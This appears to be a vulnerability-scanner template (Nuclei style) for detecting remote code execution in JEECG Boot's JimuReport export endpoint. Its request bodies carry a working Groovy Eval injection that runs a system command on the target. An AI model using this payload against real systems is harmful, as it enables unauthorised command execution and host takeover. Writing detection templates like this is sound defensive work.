id: jeecgboot-jimureport-auto-export-rce
info:
  name: JEECG Boot - 远程代码执行漏洞
  author: l1nk
  severity: critical
  description: |
    该模板用于检测 JEECG Boot - 远程代码执行漏洞。该类漏洞通常与危险接口暴露、命令参数拼接、模板解析、反序列化或组件缺陷有关，攻击者可能让服务端执行非预期代码。模板会向 `/jmreport/auto/export`、`/jeecg-boot/jmreport/auto/export` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可在目标服务权限范围内执行命令或代码，进而接管应用所在主机。
    - 成功利用后可能泄露配置、密钥和业务数据，并为横向移动、持久化控制或破坏业务提供入口。
  remediation: |
    - 升级受影响产品或组件到厂商修复版本，移除存在已知缺陷的依赖。
    - 限制高危接口的公网访问，增加认证、授权和来源校验，并避免将用户输入传入命令执行、模板解析或反序列化流程。
    - 排查异常进程、计划任务、WebShell、外联连接和新增账号，必要时轮换凭据并重建受影响环境。
  reference:
    - https://github.com/jeecgboot/JeecgBoot/issues/9837
  metadata:
    verified: true
    max-request: 4
    vuln-id: CT-5432124
    vendor: jeecg
    product: jeecg-boot
  tags: rce,vuln,jeecg-boot
variables:
  s1: '{{rand_int(10000000, 20000000)}}'
  s2: '{{rand_int(1000000, 2000000)}}'
flow: http(1) || http(3) || http(2) || http(4)
http:
  - method: POST
    path:
      - '{{BaseURL}}/jmreport/auto/export'
    redirects: false
    headers:
      Content-Type: application/json
    body: '{}'
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "请选择需要导出的报表") && contains(body, "\"code\":500") && contains(body, "\"success\":false")'
  - method: POST
    path:
      - '{{BaseURL}}/jmreport/auto/export'
    redirects: false
    headers:
      Content-Type: application/json
    body: |
      {"reportParams":[{"id":"1338744112815411200","params":{"x":"=use groovy.util.Eval; Eval.me('assert false : \"expr {{s1}} - {{s2}}\".execute().text')"},"exportType":"pdf"}]}
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, to_string(s1 - s2)) && contains(body, "\"code\":500") && contains(body, "\"success\":false")'
  - method: POST
    path:
      - '{{BaseURL}}/jeecg-boot/jmreport/auto/export'
    redirects: false
    headers:
      Content-Type: application/json
    body: '{}'
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "请选择需要导出的报表") && contains(body, "\"code\":500") && contains(body, "\"success\":false")'
  - method: POST
    path:
      - '{{BaseURL}}/jeecg-boot/jmreport/auto/export'
    redirects: false
    headers:
      Content-Type: application/json
    body: |
      {"reportParams":[{"id":"1338744112815411200","params":{"x":"=use groovy.util.Eval; Eval.me('assert false : \"expr {{s1}} - {{s2}}\".execute().text')"},"exportType":"pdf"}]}
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, to_string(s1 - s2)) && contains(body, "\"code\":500") && contains(body, "\"success\":false")'
